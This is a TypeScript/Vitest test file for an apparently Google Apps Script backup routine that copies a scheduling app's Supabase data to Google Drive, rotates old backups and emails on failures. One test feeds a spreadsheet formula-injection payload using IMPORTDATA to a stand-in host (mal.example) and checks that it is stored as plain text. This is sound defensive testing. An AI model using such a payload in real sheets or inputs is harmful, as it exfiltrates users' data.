import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { carregarScript, criarGoogleFalso } from '../helpers/appsScript';

const DADOS = {
  versao: 1, gerado_em: '2026-11-15T06:02:00Z',
  clientes: [{ id: 'c1', nome: 'João', telefone: '5511987654321', criado_em: '2026-11-01T13:00:00Z' }],
  servicos: [], horarios_ajuste: [],
  agendamentos: [{ id: 'a1', cliente_id: 'c1', servico_id: null, inicio: '2026-11-18T12:00:00Z', fim: '2026-11-18T12:30:00Z', status: 'marcado', origem: 'link', observacao: null }],
  configuracoes: [{ nome_negocio: 'B', passo_min: 30, dias_abertos: 14, folgas: [], expediente: {} }],
};
const CONFIG = { SUPABASE_URL: 'https://abc.supabase.co', SUPABASE_ANON_KEY: 'anon', CHAVE_BACKUP: 'k'.repeat(43) };
const PASTA = 'Backups da Agenda';

function ok(url: string) {
  if (url.endsWith('rpc/exportar_backup')) return { codigo: 200, texto: JSON.stringify(DADOS) };
  return { codigo: 200, texto: JSON.stringify({ apagados: 3 }) };
}

beforeEach(() => {
  vi.useFakeTimers({ toFake: ['Date'] });
  vi.setSystemTime(new Date('2026-11-15T06:02:00Z')); // domingo 03:02 em São Paulo
});
afterEach(() => vi.useRealTimers());

const pastaViva = (g: ReturnType<typeof criarGoogleFalso>) => g.pastas.find((p) => p.nome === PASTA && !p.lixeira)?.id;
const vivos = (g: ReturnType<typeof criarGoogleFalso>) =>
  g.arquivos.filter((f) => f.pasta === pastaViva(g) && !f.lixeira).map((f) => f.nome);

describe('Backup.gs', () => {
  it('fazerBackup cria a planilha com as 5 abas e o JSON, e chama concluir_backup', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, CONFIG);
    const r = s.fazerBackup();
    expect(r.ok).toBe(true);
    expect(g.chamadas.map((c) => c.url)).toEqual([
      'https://abc.supabase.co/rest/v1/rpc/exportar_backup',
      'https://abc.supabase.co/rest/v1/rpc/concluir_backup',
    ]);
    for (const c of g.chamadas) {
      expect(JSON.parse(c.corpo)).toEqual({ chave: 'k'.repeat(43) });
      expect(c.headers).toMatchObject({ apikey: 'anon', Authorization: 'Bearer anon' });
    }
    expect(vivos(g).sort()).toEqual(['Backup Agenda 2026-11-15', 'backup-agenda-2026-11-15.json']);
    const planilha = g.arquivos.find((f) => f.nome === 'Backup Agenda 2026-11-15')!;
    expect(Object.keys(planilha.abas!)).toEqual(['Agendamentos', 'Clientes', 'Serviços', 'Pessoas', 'Configurações']);
    expect(planilha.abas!.Agendamentos[1]).toEqual(['18/11/2026', '09:00', 'João', '5511987654321', '—', '', 'Marcado', 'Link', '']);
    expect(JSON.parse(g.arquivos.find((f) => f.nome.endsWith('.json'))!.conteudo!)).toEqual(DADOS);
    expect(g.emails).toEqual([]);
  });

  it('chave com espaço ou quebra de linha nas pontas é aparada', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, { ...CONFIG, CHAVE_BACKUP: `  ${'k'.repeat(43)}\n` });
    s.fazerBackup();
    expect(JSON.parse(g.chamadas[0].corpo)).toEqual({ chave: 'k'.repeat(43) });
  });

  it('Supabase fora do ar: e-mail curto com HTTP 540 e nada concluído', () => {
    const html = `<html><body>${'Project paused '.repeat(100)}</body></html>`;
    const g = criarGoogleFalso({ responder: () => ({ codigo: 540, texto: html }) });
    const s = carregarScript(g, CONFIG);
    expect(s.fazerBackup().ok).toBe(false);
    expect(g.emails).toHaveLength(1);
    expect(g.emails[0].para).toBe('negocio@exemplo.com');
    expect(g.emails[0].assunto).toBe('Backup da agenda falhou');
    expect(g.emails[0].corpo.startsWith('O backup da agenda desta semana falhou: HTTP 540:')).toBe(true);
    expect(g.emails[0].corpo.endsWith('. Abra o app e use Ajustes → Baixar backup enquanto isso.')).toBe(true);
    expect(g.emails[0].corpo.length).toBeLessThan(400);
    expect(g.chamadas.some((c) => c.url.endsWith('concluir_backup'))).toBe(false);
  });

  it('segundo backup no mesmo dia manda os anteriores de mesmo nome para a lixeira', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, CONFIG);
    s.fazerBackup();
    s.fazerBackup();
    expect(vivos(g).sort()).toEqual(['Backup Agenda 2026-11-15', 'backup-agenda-2026-11-15.json']);
    expect(g.arquivos.filter((f) => f.lixeira)).toHaveLength(2);
  });

  it('mantém 12: com 12 planilhas antigas na pasta, a mais velha vai para a lixeira', () => {
    const g = criarGoogleFalso({ responder: ok });
    const antigas = Array.from({ length: 12 }, (_, i) => `Backup Agenda ${new Date(Date.UTC(2026, 7, 2 + 7 * i)).toISOString().slice(0, 10)}`);
    g.preencherPasta(antigas);
    const s = carregarScript(g, CONFIG);
    s.fazerBackup();
    const planilhas = vivos(g).filter((n) => n.startsWith('Backup Agenda'));
    expect(planilhas).toHaveLength(12);
    expect(planilhas).not.toContain(antigas[0]);
    expect(planilhas).toContain('Backup Agenda 2026-11-15');
  });

  it('instalar troca o gatilho antigo por um semanal de domingo às 3h e faz o primeiro backup', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, CONFIG);
    s.instalar();
    s.instalar();
    expect(g.gatilhos()).toEqual([{ funcao: 'fazerBackup', dia: 'SUNDAY', hora: 3, semanas: 1 }]);
    expect(vivos(g)).toContain('Backup Agenda 2026-11-15');
  });

  it('pasta de backups jogada na lixeira: falha com e-mail e nada é concluído', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, CONFIG);
    s.instalar();
    g.pastas.forEach((p) => (p.lixeira = true));
    const antes = g.chamadas.length;
    expect(s.fazerBackup().ok).toBe(false);
    expect(g.emails.at(-1)!.corpo).toContain('lixeira');
    expect(g.chamadas.slice(antes).some((c) => c.url.endsWith('concluir_backup'))).toBe(false);
  });

  it('instalar ignora uma pasta de mesmo nome que está na lixeira e cria outra', () => {
    const g = criarGoogleFalso({ responder: ok });
    const velha = g.preencherPasta([]);
    velha.lixeira = true;
    const s = carregarScript(g, CONFIG);
    s.instalar();
    const nova = g.pastas.find((p) => p.nome === PASTA && !p.lixeira)!;
    expect(nova.id).not.toBe(velha.id);
    expect(vivos(g)).toContain('Backup Agenda 2026-11-15');
  });

  it('a limpeza ignora o que já está na lixeira e nomes repetidos (rodar várias vezes no mesmo dia)', () => {
    const g = criarGoogleFalso({ responder: ok });
    const antigas = Array.from({ length: 11 }, (_, i) => `Backup Agenda ${new Date(Date.UTC(2026, 7, 2 + 7 * i)).toISOString().slice(0, 10)}`);
    g.preencherPasta(antigas);
    g.preencherPasta(['Backup Agenda 2026-11-15', 'Backup Agenda 2026-11-15'], true); // execuções anteriores de hoje
    const s = carregarScript(g, CONFIG);
    s.fazerBackup();
    const planilhas = vivos(g).filter((n) => n.startsWith('Backup Agenda'));
    expect(planilhas).toHaveLength(12);
    for (const a of antigas) expect(planilhas).toContain(a);
  });

  it('nome com fórmula vindo do link entra como texto na planilha', () => {
    const malicioso = '=IMPORTDATA("https://mal.example/?"&B2:D500)';
    const g = criarGoogleFalso({
      responder: (url) =>
        url.endsWith('rpc/exportar_backup')
          ? { codigo: 200, texto: JSON.stringify({ ...DADOS, clientes: [{ ...DADOS.clientes[0], nome: malicioso }] }) }
          : { codigo: 200, texto: JSON.stringify({ apagados: 0 }) },
    });
    const s = carregarScript(g, CONFIG);
    s.fazerBackup();
    const planilha = g.arquivos.find((f) => f.nome === 'Backup Agenda 2026-11-15')!;
    expect(planilha.abas!.Agendamentos[1][2]).toBe(`'${malicioso}`);
    expect(planilha.abas!.Clientes[1][0]).toBe(`'${malicioso}`);
    expect(planilha.formato).toBe('@');
  });

  it('falha do Drive logo no começo também manda o e-mail', () => {
    const g = criarGoogleFalso({ responder: ok });
    const s = carregarScript(g, CONFIG);
    g.falharDrive('Service error: Drive');
    expect(s.fazerBackup().ok).toBe(false);
    expect(g.emails).toHaveLength(1);
    expect(g.emails[0].corpo).toContain('Service error: Drive');
    expect(g.chamadas.some((c) => c.url.endsWith('concluir_backup'))).toBe(false);
  });
  it('sem a propriedade CHAVE_BACKUP: nada é exportado e chega e-mail explicando (SEC-007)', () => {
    const g = criarGoogleFalso({ responder: ok });
    const { CHAVE_BACKUP: _, ...semChave } = CONFIG;
    const s = carregarScript(g, semChave);
    const r = s.fazerBackup();
    expect(r.ok).toBe(false);
    expect(g.chamadas).toEqual([]);
    expect(g.emails[0].corpo).toContain('CHAVE_BACKUP');
  });

  it('a chave de backup não fica no código: CONFIG não tem CHAVE_BACKUP (SEC-007)', () => {
    const codigo = readFileSync(resolve(__dirname, '../../apps-script/Backup.gs'), 'utf8');
    const config = codigo.slice(codigo.indexOf('var CONFIG'), codigo.indexOf('};', codigo.indexOf('var CONFIG')));
    expect(config).not.toContain('CHAVE_BACKUP');
  });

  it('o manifesto pede o Drive inteiro: o DriveApp não funciona com drive.file (risco aceito no SEC-007)', () => {
    const manifesto = JSON.parse(readFileSync(resolve(__dirname, '../../apps-script/appsscript.json'), 'utf8'));
    expect(manifesto.oauthScopes).toContain('https://www.googleapis.com/auth/drive');
    expect(manifesto.oauthScopes).not.toContain('https://www.googleapis.com/auth/drive.file');
  });
});
